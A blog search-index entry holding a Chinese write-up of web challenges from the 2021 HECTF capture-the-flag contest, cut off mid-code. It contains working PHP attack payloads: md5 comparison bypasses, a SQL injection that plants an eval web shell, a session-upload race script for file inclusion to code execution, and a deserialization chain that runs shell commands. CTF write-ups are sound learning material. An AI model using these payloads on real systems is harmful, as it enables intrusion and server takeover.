<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021HECTF—河北师范大学信息安全挑战赛部分WP</title>
    <url>/article/84f3998a.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222015056-373531408.png" alt="image" /></p>
<h2 id="web"><a class="anchor" href="#web">#</a> WEB</h2>
<h3 id="mmmmd5d5d5d5"><a class="anchor" href="#mmmmd5d5d5d5">#</a> mmmmd5d5d5d5</h3>
<p>链接打开页面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222308511-2087116568.png" alt="image" /></p>
<p>绕过</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222356578-2020512568.png" alt="image" /></p>
<p>构造 md5</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> $i <span class="token operator">&lt;=</span> <span class="token number">100000</span> <span class="token punctuation">;</span> $i <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>$i<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"3ddc6"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  echo $i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>进入到下一层</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222417158-677545439.png" alt="image" /></p>
<p>提交</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ffifdyop</pre></td></tr></table></figure><p>得到：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>include <span class="token string">"flag.php"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">=</span>$_POST<span class="token punctuation">[</span><span class="token char">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    echo $flag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222445656-1216210145.png" alt="image" /></p>
<p>构造 payload：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr></table></figure><p>即可得到 flag</p>
<h3 id="edgnb签到"><a class="anchor" href="#edgnb签到">#</a> EDGnb (签到)</h3>
<p>直接 docker 桌面版打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222527544-1785668409.png" alt="image" /></p>
<p>即可得到 flag</p>
<h3 id="时光塔的宝藏"><a class="anchor" href="#时光塔的宝藏">#</a> 时光塔的宝藏</h3>
<p>链接打开一个 login 框</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/20211218192945.png" alt="20211218192945" /></p>
<p>构造 payload：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>pswd<span class="token operator">=</span>admin<span class="token operator">&amp;</span>usname<span class="token operator">=</span>admin<span class="token string">' union select 1,"&lt;?php eval($_POST[1]);?>" into outfile '</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1203</span><span class="token punctuation">.</span>php'<span class="token punctuation">;</span>#</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222615764-767952291.png" alt="image" /></p>
<p>蚁剑连 1203.php，密码为 1，即可得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222628696-1030248584.png" alt="image" /></p>
<h3 id="lfi_to_rce"><a class="anchor" href="#lfi_to_rce">#</a> LFI_to_RCE</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'./index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    include $_GET<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> <span class="token function">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Filename cannot be empty <span class="token keyword">in</span> <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php on line <span class="token number">3</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> <span class="token function">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Failed opening <span class="token string">''</span> <span class="token keyword">for</span> <span class="token function">inclusion</span> <span class="token punctuation">(</span>include_path<span class="token operator">=</span><span class="token string">'.:/usr/local/lib/php'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php on line <span class="token number">3</span></pre></td></tr></table></figure><p>贴上 exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> io</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://81.70.102.209:10040/index.php"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sessid <span class="token operator">=</span> <span class="token string">"21r000"</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    filebytes <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">BytesIO</span><span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        res <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                <span class="token string-property property">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token operator">:</span> <span class="token string">"&lt;?php eval($_POST[1]);?>"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token string-property property">'PHPSESSID'</span><span class="token operator">:</span> sessid</pre></td></tr><tr><td data-num="17"></td><td><pre>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token string-property property">'file'</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token string">'21r000.jpg'</span><span class="token punctuation">,</span> filebytes<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>def <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        res <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?file=/tmp/sess_"</span><span class="token operator">+</span>sessid<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                           data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                               <span class="token string-property property">"1"</span><span class="token operator">:</span><span class="token string">"system('ls /');"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                           cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                               <span class="token string-property property">"PHPSESSID"</span><span class="token operator">:</span>sessid</pre></td></tr><tr><td data-num="31"></td><td><pre>                           <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                           <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"etc"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token function">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    </pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"main"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        evnet <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Event</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">with</span> requests<span class="token punctuation">.</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token literal-property property">session</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        evnet<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211114222703698-1152852302.png" alt="image" /></p>
<p>访问即可得到 flag</p>
<h3 id="unserialize"><a class="anchor" href="#unserialize">#</a> unserialize</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>include <span class="token string">'hint.php'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">x</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> $cc<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'fighting!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> $nice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">===</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>cc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test<span class="token operator">-</span><span class="token operator">></span><span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">public</span> $array<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            echo <span class="token string">'must_array'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token parameter">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span>$func<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'y0u_A2e_HacKK!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token function">$func</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    $pop <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token function">unserialize</span><span class="token punctuation">(</span>$pop<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>pop 链问题把 a：2 改成 a：3</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>pop<span class="token operator">=</span>TzoxOiJhIjozOntzOjQ6Im5pY2UiO3M6Mzc6Ik86MToieCI6Mjp7czo1OiJ2YWx1ZSI7TjtzOjI6ImNjIjtOO30iO3M6NDoidGVzdCI7TzoxOiJiIjoyOntzOjU6InZhbHVlIjtzOjc6IlxzeXN0ZW0iO3M6NToiYXJyYXkiO2E6Mjp7aTowO086MToiYyI6MTp7czo1OiJ2YWx1ZSI7czo5OiJjYXQgL2ZsYWciO31pOjE7czo1OiJzaGVsbCI7fX19</pre></td></tr></table></figure><p>贴上 poc</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">x</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> $value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> $cc<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>cc <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'fighting!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> $nice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">===</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>cc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test<span class="token operator">-</span><span class="token operator">></span><span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">public</span> $value <span class="token operator">=</span> <span class="token string">"\system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">public</span> $array <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token 